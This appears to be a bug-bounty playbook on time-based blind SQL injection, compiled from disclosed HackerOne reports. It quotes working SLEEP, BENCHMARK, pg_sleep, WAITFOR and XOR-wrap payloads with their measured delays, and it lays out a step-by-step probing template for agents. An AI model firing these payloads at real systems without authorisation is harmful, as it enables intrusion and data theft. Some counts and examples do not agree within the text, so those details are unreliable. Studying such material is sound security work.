---
title: "Time-Based Blind SQL Injection — the measured-delay oracle"
type: playbook
category: time-based-blind
cwe: "CWE-89"
source_count: 37
full_bodies_available: 37
corpus: "HackerOne disclosed reports, 2014–2022 era, list seeded from github.com/shreyaschavhan/h1-reports-for-reference TOPSQLI.md, bodies fetched via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-25"
note: "Every claim traces to bodies read in full this session; bounty figures are JSON amounts where present, otherwise as stated on the source list (marked). Severity/weakness labels are archive-era historical; bodies are the class authority."
---

# Time-Based Blind SQL Injection — the measured-delay oracle

## 1. Overview

The single largest cluster in this corpus (37 confirmed full-body cases) is not
visible-output SQLi but a **clock as a data channel**: an attacker-supplied SQL
expression makes the server pause a chosen number of seconds, and the *difference
between that pause and the baseline* proves the injection and then carries one bit
at a time of database content.

The corpus teaches one procedural invariant across 2014 and 2022 alike:

> **Do not confirm with a single sleep value. Confirm with a *series*.**

The strongest reports show three or more delay requests (typically `sleep(N)` for
two or three different N, plus `sleep(0)`) whose observed times climb with the
supplied value. Three cases upgrade this to **arithmetic verification** — the
supplied expression is not `sleep(30)` but `sleep(30)` written as arithmetic the
database must evaluate (`5*5`, `5*5*0`, `6*6-30`), which simultaneously proves
expression evaluation and defeats naive pattern-matching of literal `sleep(N)`
strings.

**Case-ID scheme: `SQL-<report id>`** (e.g. `SQL-297478`).

## 2. The measured-series evidence pattern (anchored cases)

### 2.1 The series table — many values, one transcript

SQL-1224660 (Acronis, bypass of #1109311) records the series as a raw table:

```
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 20.002
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.282
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.912
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 16.553
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.463
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 1.229
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.79
```

Note the *interleaved repeats* of 15 and 0 — the report's own transcript shows
non-monotone consensus checking: the same value is sent twice and both readings
must agree before a claim is made.

SQL-374027 (Serendipity blog, Hanno's projects) does the same on a URL path, with
a zero baseline of ~0.25 s measured three times against a ~6.27 s band:

```
if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/ => 3.276 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.28 s
if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/ => 9.298 s
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/ => 6.272 s
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/ => 0.265 s
```

SQL-924855 and SQL-1069531 (two reports, same MTN host) both show a 15 → 3.4 → 6.4
→ 0.4 series against a login parameter.

### 2.2 Arithmetic verification — the strongest proof form

SQL-297478 (GSA Bounty, `labs.data.gov`, via **User-Agent** header) is the era's
cleanest articulation. The report confirms with sleep values expressed as arithmetic
and explains each:

> setting the value `Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'` to the `User-Agent` header will cause the server to sleep for **25 (5*5)** seconds.

> Now, let's cause the server to respond immediately. We will send the value **sleep(5*5*0)** that is equivalent with **0**.

> The server responded immediately as **5*5*0 = 0**.

Then a third value:

> This time the payload contains **6*6-30** that is equal with **6**. The server responded after **6** seconds.

and closes: *"These are just a few of the SQL queries with various arithmetic
operations that I've tried to confirm this issue."*

The invariant: **25, 0, 6 — three arithmetic-distinct delays that cannot be a
coincidence of filtering or caching**. SQL-723044 (DoD, Referer carrier) uses the
same shape compactly:

> 2- put this payload in Referer '+(select*from(select(sleep(6*6)))a

### 2.3 Discovering the multiplier — sleep value ≠ response seconds

Not every vulnerable path sleeps once per request. SQL-488795 (DoD, `library.php`)
measured that supplied values came back scaled by a constant:

> - By issuing sleep(0) response will be delayed to 0 seconds.
> - By issuing sleep(1) response will be delayed to 5 seconds.
> - By issuing sleep(2) response will be delayed to 10 seconds.
> - By issuing sleep(5) response will be delayed to 25 seconds.

> Apparently, SQL statement is executing 5 times on the database side, because response time always 5 times bigger than supplied sleep value.

**Agent rule**: calibrate first with two supplied values; if observed time is not
`value × 1`, record the multiplier — the extraction loop's timing budget depends on
it.

## 3. The per-DBMS delay-call book

Each cluster row names the server-side delay primitive in use. All of these were
*observed working* in a disclosed report:

| DBMS | Delay call | Corpus anchor cases |
|---|---|---|
| MySQL | `SLEEP(n)` | SQL-297478, SQL-1224660, SQL-198292, SQL-876800, SQL-838855, (sic `sleep` lowercase in bodies) |
| MySQL | `BENCHMARK(count, expr)` | SQL-17227, SQL-144359 |
| PostgreSQL | `pg_sleep(n)` | SQL-435066, SQL-242882 |
| MSSQL | `WAITFOR DELAY '0:0:n'` | SQL-381758, SQL-1034625, SQL-1125752 |
| Oracle | heavy-query stacking `(SELECT COUNT(*) FROM ALL_USERS T1,…)` only; `DBMS_LOCK.SLEEP` tested by sqlmap | SQL-214798 |

BENCHMARK anchors, verbatim:

> https://staging.uzbey.com/zoom-image/BENCHMARK(10000000,SHA1(1)) — *"The following will cause the script to run a benchmark, returning an error 8-10 seconds later"* (SQL-17227)

SQL-144359 (WebSummit, informative verdict): *"There is possibility of inducing some time delay in the "url" parameter of the videos.websummit.com using the Benchmark() and SQL queries"*. Recorded as a detection-only row.

pg_sleep anchors:

> `curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(5\)%3B--%27` — `total 5.726` (`$ time curl …`, SQL-435066, HackerOne's own program)

> *viewVideo.asp?t=7* ---------------------------> 240-330 milliseconds
> *viewVideo.asp?t=pg_sleep(__30__)--* ----> 15000-19000 milliseconds (SQL-242882's measured band table)

WAITFOR anchors:

> `-d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"` → `cpu 2.048 total` vs `'0:0:13'--` → `cpu 14.045 total` (SQL-1034625, Informatica tsftp)

> `1'; waitfor delay '0:0:2' -- ` and the error page will return after `2` second (SQL-381758)

Oracle (SQL-214798): the working "heavy query" vector recorded by sqlmap —

> Payload: …**4917=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)**-- vKNF

plus the transcript rows `testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'` and
`'Oracle AND time-based blind (heavy query)' injectable`.

## 4. Carriers — where the era found the parameter

| Carrier | Cases (confirmed) |
|---|---|
| POST/GET parameter (form, JSON kwarg, GraphQL argument, search/sort admin fields) | majority — e.g. SQL-1044698 (`"acctid"` **inside a JSON payload sent as a query parameter**), SQL-876800 (`fSearchDefaultSortDirection` sort direction of an admin user search), SQL-433792 (analytics pixel `url=`), SQL-198292 (`group_id`) |
| HTTP header: **User-Agent** | SQL-297478, SQL-771215 |
| HTTP header: **Referer** | SQL-723044, SQL-1018621 |
| URI path segment | SQL-17225 (`/tiles1600/693/sleep(10)`), SQL-17227, SQL-374027 (`/plugin/tag/<payload>`) |
| URL-ish encoded field inside another protocol (`p=` base64 in Salesforce-style tracking) | SQL-150156 (dumped via ordering oracle — cross-file: Boolean playbook) |
| Cookie parameter | no confirmed *extractive* case in this cluster; the cookie-carrier detection pair lives cross-file (SQL-761304, Error playbook) |

SQL-433792 is worth an honest note: the vulnerable endpoint belonged to a
third-party (agilecrm) that the target's site loaded — the report itself:

> https://stats2.agilecrm.com/addstats?…&new=(select*from(select(sleep(5)))a)&ref=&domain=dorgam

and *"Result: 5 seconds of loading."* Carriers can live outside the target's own
code.

## 5. The XOR-wrap context adapter

Four independent reports converged on one compact payload shape that survives
double-quoted, single-quoted, and comment-enclosed contexts at once (payload text
quoted from SQL-1069531):

```
phone_number=0'XOR(if(now()=sysdate()%2Csleep(12)%2C0))XOR'Z
```

and the triple-quote/comment-covering long form from SQL-374027:

```
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/
```

Reading it as the corpus does: an expression sequence where whichever token pair
(`'`, `"`, or `/*…*/`) encloses the injected text, the boolean-delay expression
stays evaluable. When a candidate sink renders a syntax error on a plain quote
test but the arithmetic series is the goal, this adapter is the era-proven first
form to try.

## 6. Impact demonstrations the corpus considers sufficient

Nobody learned anything from a full dump. The strongest reports proved *code
execution in the SQL interpreter* then retrieved low-risk scalars only:

- SQL-491191 / SQL-489483 (DoD, `pub_group_id`): sleep series + **DB banner only**
  via `sqlmap … --technique=T -p pub_group_id --banner --force-ssl --level=5`,
  result `5.5.62-0ubuntu0.14.04.1`, with the explicit guardianship line
  *"No sensitive data such as databases, tables, or content was accessed."*
- SQL-488795: *"retrieved count of databases (3)"*.
- SQL-313037 (DoD, `rememail` POST parameter): sleep(2)/sleep(0) pair, then the
  version oracle built *inside the time channel*:

  > rememail=[REDACTED_EMAIL]'%2bIF(MID(@@version,1,1)=4,sleep(2),1)=2%2b'

  with *"True scenario will result in the Database sleeping for 2 seconds, false it won't sleep"*, then *"I was able to escalate from simple time queries to reading data and executing other commands by combing sleep queries with true/false statements."*

- SQL-198292 (Starbucks news site): single-tick boolean-time oracle that also
  fingerprinted: `1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1` →
  `real 0m4.945s` (note again >1× observed, statement executed more than once).
- SQL-838855 (Zomato, $2,000 JSON): CASE-based conditional sleep in Havij-style
  form: `res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0`
  — comment-slash rewriting applied inside a conditional (`/**` without `Y`),
  the era's known whitespace filter adapter.

## 7. Regression & bypass — the same sink returns

Three full-body cases are *re-openings* of previously disclosed/resolved bugs, and
two are explicit bypasses of a fix:

- SQL-348047 (DoD): *"I just noticed that my publicly disclosed report, https://hackerone.com/reports/311922 is sstill vulnerable either a code reversion was made or something was done to revert the patch."* (sic "sstill", kept from source)
- SQL-1224660 (Acronis): titled **"bypass sql injection #1109311"**; the fix had
  changed the context; the XOR-wrap series re-opened it on the same parameter
  family.
- SQL-692326 (DoD): *"This is a follow up to a previous report"* (#674838) — first
  pass could not resolve the injection because *"The default configuration of sqlmap will not be able to find the sql injection"*; the follow-up records the adapter chain that did: *"'--risk 2 --level 3' and '--tamper=space2comment,randomcase,between'"*.
- SQL-1018621 (DoD): *"There is one of these injection points that is supposedly fixed at report #995122 (report disclosed, resolved.. but it's not..)"*

**Invariants for the agent**: a disclosed historic bug in a given codebase is a
candidate regression; patched endpoints are retested on minor parameter/encoding
changes (XOR-wrap, `/**/`-rewrites, sort-direction values).

## 8. Agent execution template

1. **Enumerate candidate injectors** with the corpus's carrier list (§4): form
   params, JSON kwargs, GraphQL arguments, admin list/search/sort fields, filter
   directions, automated query parameters (connectors' search/sort tokens),
   User-Agent, Referer, URI path segments.
2. **Detection pair, minimal harm**: one quote-trigger and one balanced trigger
   (`'` vs `''`) per candidate — many era reports showed the pair oracle.
   SQL-761304's cookie case: *"If you inject one quote mark like '. You get SQL error with the syntax. By injecting a second you have the error removed."*
3. **Series, not single**: three values `sleep(0) / sleep(S) / sleep(2S)` minimum
   with a fresh baseline row interleaved. Record every value in a transcript like
   §2.1.
4. **Arithmetic upgrade** when a naive value is enough in one position only:
   `sleep(5*5)`, `sleep(5*5*0)`, `sleep(6*6-30)` — the corpus pattern — before any
   claim is made.
5. **Calibrate the multiplier** (§2.3): an observed time that is not value × 1 is
   recorded, not assumed.
6. **DBMS fingerprint from the delay call itself**: the corpus's call book (§3) as
   the probe order; conform to observed syntax, not the guess.
7. **Scalar proof only, unless scoping authorizes deeper**: banner/version or
   schema count is the corpus-demonstrated ceiling for most programs.
8. **Rate discipline**: the era's own remediation text condensed it —
   *"Rate limit submissions of forms. Time based sql injection requires many more HTTP requests than would be seen from legitimate browser activity."*
   (SQL-692326). Mirror the target's constraints; keep request volume in line with
   human-scale traffic.

## 9. Validation gates (all six met before any claim)

1. **Series rule** — at least three delay values observed monotone with supplied
   arithmetic, including an arithmetic-0 baseline, not a single `sleep(10)`.
2. **Repeatability** — every value in the series re-issued at least once; two
   measurements in disagreement = inconclusive (SQL-1224660's own table shows 15
   read twice: 20.002 then 16.553 — a 3.4-second variance the report still
   published; a stricter agent demands two agreeing readings before claiming).
3. **Carrier attribution** — the exact request (header/param/path) recorded, and
   the sibling request with the same carrier minus the payload — otherwise the
   claim cannot survive triage.
4. **No content harvest without authorization** — the corpus ceiling: version
   banner/schema counts (see §6). Anything beyond needs explicit scope.
5. **Era-label correction** — archive labels like "*Code Injection*" (SQL-1250293)
   or "*XSS*" (SQL-313037-adjacent rows) are not the class authority; report
   CWE-89 **Blind SQL Injection (CWE-89 time-based)**.
6. **Baseline honesty** — a slow site (Σ ~0.3–0.9 s overhead, per the corpus's
   own zero-baselines) makes sub-second band thresholds matters; state the
   baseline number in the report.

## 10. Remediation the corpora reports themselves propelled

- Parameterized statements over concatenation — the echoed counsel across nearly
  all 35 bodies (e.g. *"Take down subdomain if not needed any more"* on a dead
  staging host, SQL-348047; *"Your script should filter metacharacters from user input"* SQL-771215).
- Rate-limit the form/endpoint — SQL-674838 + SQL-692326 both argue cost: time-based extraction is many slow requests.
- Disable verbose error pages before they feed the next vector — see the Boolean
  playbook's §5 note on SQL-519631.
- Hunt down shared staging (`SQL-433792` third-party analytics; `SQL-894325`
  easy2pay*I whitelist's bypass in a dead-body archive row) — the sink may belong
  to a vendor of yours.

## 11. Archive-era label honesty

Severity and weakness labels below come from the era's own archive; bodies trump
them. Notable label noise in this category: SQL-1250293 labeled **"Code
Injection"** for boolean arithmetic-difference tests; SQL-197755 (US Navy) recorded with
`HSQLDB` guesses in sqlmap runs which are inconsistent in the body's own text
(commands re-run three ways) — treat reported DBMS as *speculative* wherever the
body does not show a definitive band. Neither label belongs in a modern report.

**Cross-references**: scalar-oracle ladders continue in `Boolean-and-Content-Oracle.md`;
visible-output extraction in `Error-and-Union-Output.md`; OOB channel in
`Out-of-Band-Callback.md`; the escalation end-game (SQLi → RCE) in
`SQLi-to-RCE-Chains.md`.
